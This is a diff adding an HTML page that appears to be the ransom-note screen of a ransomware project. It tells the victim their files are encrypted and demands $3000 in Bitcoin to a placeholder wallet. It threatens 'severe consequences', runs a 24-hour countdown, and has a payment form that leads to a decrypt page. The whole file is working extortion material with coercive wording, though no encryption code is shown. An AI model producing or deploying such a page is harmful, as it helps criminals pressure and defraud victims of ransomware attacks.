@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Critical Warning!</title>
+    <style>
+		body {
+			background: url('background.jpeg') no-repeat center center fixed;
+			background-size: cover;
+			color: #EB107A;
+			font-family: Arial, sans-serif;
+			text-align: center;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+			margin: 0;
+			position: relative;
+			z-index: 0;
+		}
+		body::before {
+			content: "";
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0, 0, 0, 0.5);
+			z-index: -1;
+		}
+        .container {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            width: 80%;
+            max-width: 1200px;
+			gap: 40px;
+        }
+        .left-section, .right-section {
+            flex: 1;
+            padding: 20px;
+            text-align: center;
+        }
+        .left-section {
+            background-color: rgba(8, 8, 8, 0.95);
+            border: 2px solid #EB107A;
+            border-radius: 8px;
+        }
+        .left-section form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        .left-section input[type="text"] {
+            width: 80%;
+            height: 30px;
+            font-size: 18px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background: #2c2c2c;
+            color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        .left-section input[type="button"] {
+            background-color: #DA3B8A;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s;
+        }
+        .left-section input[type="button"]:hover {
+            background-color: #c72a6b;
+        }
+        .right-section {
+            background-color: rgba(8, 8, 8, 0.95);
+            border: 2px solid #EB107A;
+            border-radius: 8px;
+            padding: 20px;
+        }
+        .right-section .timer {
+            font-size: 2em;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .right-section .ransom-details {
+            background: #2c2c2c;
+            padding: 20px;
+            border: 2px solid #EB107A;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .right-section .ransom-details p {
+            margin: 10px 0;
+            color: white;
+        }
+        .payment-link {
+            color: #EB107A;
+            text-decoration: underline;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        h1 {
+            color: #DA3B8A;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <form>
+                <label>Your Ransom ID (written inside the .txt file):</label>
+                <input type="text" name="ransom_id" placeholder="Enter Your Ransom ID" required><br>
+                <label>Cryptocurrency wallet address:</label>
+                <input type="text" name="wallet_address" placeholder="Enter Wallet Address" required><br>
+                <label>Amount of cryptocurrency:</label>
+                <input type="text" name="amount" placeholder="Enter 3000$ in Bitcoin" required><br>
+				<input type="button" value="Pay" onclick="validateForm()">
+            </form>
+        </div>
+        <div class="right-section">
+            <h1>YOUR FILES HAVE BEEN ENCRYPTED!</h1>
+            <p class="warning">Do not attempt to close this page or interrupt the payment.</p>
+			<p class="warning">Severe consequences will follow.</p>
+            <div class="timer" id="timer">Time remaining: 24:00:00</div>
+
+            <div class="ransom-details">
+                <p>Amount to pay: <strong>3000$ in BTC</strong></p>
+                <p>Send the payment to the following wallet:</p>
+                <p class="payment-link">1ABC23XYZ456DEF789GHI012JKL34MNO56PQR78</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let timer = 86400; // 24 ore in secondi
+        let interval = setInterval(() => {
+            let hours = Math.floor(timer / 3600);
+            let minutes = Math.floor((timer % 3600) / 60);
+            let seconds = timer % 60;
+            document.getElementById("timer").innerHTML = `Time remaining: ${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+            timer--;
+            if (timer < 0) {
+                clearInterval(interval);
+                document.getElementById("timer").innerHTML = "Time's up!";
+            }
+        }, 1000);
+
+		function validateForm() {
+			const ransomId = document.querySelector('input[name="ransom_id"]').value.trim();
+			const walletAddress = document.querySelector('input[name="wallet_address"]').value.trim();
+			const amount = document.querySelector('input[name="amount"]').value.trim();
+			if (!ransomId || !walletAddress || !amount) {
+				alert("All fields must be filled out before proceeding!");
+				return;
+			}
+			window.location.href = 'decrypt.html';
+		}
+    </script>
+</body>
+</html>
